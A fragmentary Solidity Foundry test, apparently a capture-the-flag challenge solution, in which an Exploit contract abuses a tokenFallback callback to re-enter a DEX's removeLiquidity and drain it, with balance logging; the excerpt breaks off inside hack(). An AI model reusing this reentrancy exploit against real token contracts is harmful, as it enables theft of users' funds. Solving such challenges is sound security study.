...
contract Challenge2Test is Test {
    ...
    function testChallenge2() public {  
        ...
        //============================//
        Exploit exploit = new Exploit(target, token0, token1, player);
        token0.transfer(address(exploit),1 ether);
        token1.transfer(address(exploit),1 ether);

        exploit.hack();
        vm.stopPrank();
        console.log("player 0",token0.balanceOf(player));
        console.log("player 1",token1.balanceOf(player));
        console.log("dex 0",token0.balanceOf(address(target)));
        console.log("dex 1",token1.balanceOf(address(target)));
...
contract Exploit {
    ...
    function tokenFallback(address, uint256, bytes memory) external {
        //Esto se ejecuta cuando el token1.trasnferFrom(,to,) tiene como msg.sender este contracto
        if(token1.balanceOf(address(dex))>0 && dex.balanceOf(address(this)) > 0){
            dex.removeLiquidity(1 ether);
        }
    }

    function hack() external {
        console.log(dex.balanceOf(address(this)));
